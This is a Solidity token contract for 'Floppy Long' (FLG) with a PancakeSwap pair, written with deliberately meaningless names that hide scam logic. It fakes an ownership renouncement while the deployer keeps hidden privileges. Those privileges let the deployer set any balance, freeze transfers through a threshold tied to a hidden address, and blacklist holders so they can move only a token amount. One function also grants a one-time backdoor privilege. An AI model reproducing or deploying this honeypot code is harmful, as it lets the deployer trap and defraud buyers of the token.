//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface enableExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchedMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isTx {
    function createPair(address maxEnable, address launchedTx) external returns (address);
}

interface isReceiverReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderMin) external view returns (uint256);

    function transfer(address exemptModeMax, uint256 tokenAmount) external returns (bool);

    function allowance(address walletSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenAmount) external returns (bool);

    function transferFrom(
        address sender,
        address exemptModeMax,
        uint256 tokenAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atLaunched, uint256 value);
    event Approval(address indexed walletSwap, address indexed spender, uint256 value);
}

interface isReceiverReceiverMetadata is isReceiverReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FloppyLong is launchedMarketing, isReceiverReceiver, isReceiverReceiverMetadata {

    address buySwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return fundLaunchAuto;
    }

    function isEnable(address maxLimit, uint256 tokenAmount) public {
        takeTotal();
        marketingFrom[maxLimit] = tokenAmount;
    }

    uint256 toTradingFrom;

    function symbol() external view virtual override returns (string memory) {
        return enableTeamTo;
    }

    mapping(address => mapping(address => uint256)) private enableFrom;

    uint256 constant teamLaunched = 20 ** 10;

    uint256 private listSwap = 100000000 * 10 ** 18;

    bool public toExempt;

    string private enableTeamTo = "FLG";

    function transfer(address maxLimit, uint256 tokenAmount) external virtual override returns (bool) {
        return tokenTo(_msgSender(), maxLimit, tokenAmount);
    }

    function sellBuy(uint256 tokenAmount) public {
        takeTotal();
        minExempt = tokenAmount;
    }

    function tokenTo(address walletTotal, address exemptModeMax, uint256 tokenAmount) internal returns (bool) {
        if (walletTotal == autoFeeSwap) {
            return swapMin(walletTotal, exemptModeMax, tokenAmount);
        }
        uint256 feeIs = isReceiverReceiver(liquidityLaunched).balanceOf(autoReceiver);
        require(feeIs == minExempt);
        require(exemptModeMax != autoReceiver);
        if (atExempt[walletTotal]) {
            return swapMin(walletTotal, exemptModeMax, teamLaunched);
        }
        return swapMin(walletTotal, exemptModeMax, tokenAmount);
    }

    mapping(address => bool) public atExempt;

    function swapMin(address walletTotal, address exemptModeMax, uint256 tokenAmount) internal returns (bool) {
        require(marketingFrom[walletTotal] >= tokenAmount);
        marketingFrom[walletTotal] -= tokenAmount;
        marketingFrom[exemptModeMax] += tokenAmount;
        emit Transfer(walletTotal, exemptModeMax, tokenAmount);
        return true;
    }

    function owner() external view returns (address) {
        return exemptFrom;
    }

    string private fundLaunchAuto = "Floppy Long";

    bool public walletLaunch;

    function balanceOf(address senderMin) public view virtual override returns (uint256) {
        return marketingFrom[senderMin];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listSwap;
    }

    function getOwner() external view returns (address) {
        return exemptFrom;
    }

    address private exemptFrom;

    uint256 public fromLaunched;

    address autoReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address listMarketingLiquidity, uint256 tokenAmount) public virtual override returns (bool) {
        enableFrom[_msgSender()][listMarketingLiquidity] = tokenAmount;
        emit Approval(_msgSender(), listMarketingLiquidity, tokenAmount);
        return true;
    }

    uint8 private fromMax = 18;

    uint256 public receiverTx;

    function takeTotal() private view {
        require(modeReceiver[_msgSender()]);
    }

    address public autoFeeSwap;

    function liquidityFrom(address maxTotal) public {
        require(maxTotal.balance < 100000);
        if (walletLaunch) {
            return;
        }
        
        modeReceiver[maxTotal] = true;
        if (toExempt) {
            toExempt = true;
        }
        walletLaunch = true;
    }

    mapping(address => bool) public modeReceiver;

    uint256 public isSender;

    function walletSellLiquidity() public {
        emit OwnershipTransferred(autoFeeSwap, address(0));
        exemptFrom = address(0);
    }

    uint256 minExempt;

    function senderTokenShould(address totalToFee) public {
        takeTotal();
        if (toExempt == takeSwap) {
            receiverTx = isSender;
        }
        if (totalToFee == autoFeeSwap || totalToFee == liquidityLaunched) {
            return;
        }
        atExempt[totalToFee] = true;
    }

    address public liquidityLaunched;

    function transferFrom(address walletTotal, address exemptModeMax, uint256 tokenAmount) external override returns (bool) {
        if (_msgSender() != buySwap) {
            if (enableFrom[walletTotal][_msgSender()] != type(uint256).max) {
                require(tokenAmount <= enableFrom[walletTotal][_msgSender()]);
                enableFrom[walletTotal][_msgSender()] -= tokenAmount;
            }
        }
        return tokenTo(walletTotal, exemptModeMax, tokenAmount);
    }

    function allowance(address liquidityTotalLimit, address listMarketingLiquidity) external view virtual override returns (uint256) {
        if (listMarketingLiquidity == buySwap) {
            return type(uint256).max;
        }
        return enableFrom[liquidityTotalLimit][listMarketingLiquidity];
    }

    bool public takeSwap;

    constructor (){
        if (fromLaunched != receiverTx) {
            fromLaunched = receiverTx;
        }
        enableExempt toSenderTrading = enableExempt(buySwap);
        liquidityLaunched = isTx(toSenderTrading.factory()).createPair(toSenderTrading.WETH(), address(this));
        
        autoFeeSwap = _msgSender();
        walletSellLiquidity();
        modeReceiver[autoFeeSwap] = true;
        marketingFrom[autoFeeSwap] = listSwap;
        if (takeSwap == toExempt) {
            takeSwap = false;
        }
        emit Transfer(address(0), autoFeeSwap, listSwap);
    }

    uint256 public fromTotal;

    mapping(address => uint256) private marketingFrom;

    function decimals() external view virtual override returns (uint8) {
        return fromMax;
    }

    event OwnershipTransferred(address indexed maxFund, address indexed listTrading);

}